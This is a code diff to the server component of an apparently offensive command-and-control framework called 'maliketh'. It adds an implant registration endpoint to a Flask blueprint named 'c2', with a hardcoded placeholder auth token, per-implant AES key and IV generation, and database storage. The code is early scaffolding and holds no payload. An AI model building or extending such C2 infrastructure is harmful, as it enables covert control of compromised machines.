@@ -1,10 +1,12 @@
 from datetime import datetime
 from flask import Blueprint, jsonify, request
 from maliketh.db import db
+import maliketh.crypto.aes
 from maliketh.models import *
 
 c2 = Blueprint('c2', __name__)
 
+implant_auth_password = "thisshouldbereplaced"
 
 
 @c2.route("/")
@@ -13,9 +15,9 @@ def hello_c2():
 
 @c2.route("/register", methods=["POST"])
 def register():
-    # Check if implant ID exists, if not, throw 404
-    if get_implant_by_id(implant_id) is not None:
-        return "Not Found", 404
+
+    if request.form.get("token") != implant_auth_password:
+        return "Unauthorized", 401
 
     # Create a new implant and add it to the db
     implant = Implant(
@@ -25,10 +27,15 @@ def register():
         os=request.user_agent.platform,
         arch=request.user_agent.platform,
         user="username_test",
-        aes_key=,
-
-
+        aes_key=maliketh.crypto.aes.generate_aes_key(),
+        aes_iv=maliketh.crypto.aes.generate_aes_iv(),
+        created_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        last_seen=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
     )
+
+    db.session.add(implant)
+    db.session.commit()
+
     return "OK", 200
 
 
